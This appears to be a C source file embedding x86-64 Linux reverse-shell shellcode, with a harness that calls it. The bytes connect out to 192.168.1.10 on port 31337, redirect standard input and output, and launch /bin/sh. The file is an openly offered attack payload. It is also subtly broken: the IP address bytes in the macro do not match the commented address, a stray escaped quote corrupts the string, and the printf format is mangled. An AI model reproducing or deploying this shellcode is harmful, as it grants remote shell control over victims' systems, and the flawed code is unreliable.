#include <stdio.h>
  
/*
 ipaddr 192.168.1.10 (c0a8010a)
 port 31337 (7a69)
*/
#define IPADDR "\xc0\x80\x10\x0a"
#define PORT "\x7a\x69"
  
unsigned char code[] = 
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
"\x02\"PORT"\xc7\x44\x24\x04"IPADDR"\x48\x89\xe6\x6a\x10"
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
"\x5f\x6a\x3b\x58\x0f\x05";
 
int
main(void)
{
    printf("Shellcode Length: %dn", (int)sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
    return 0;
}
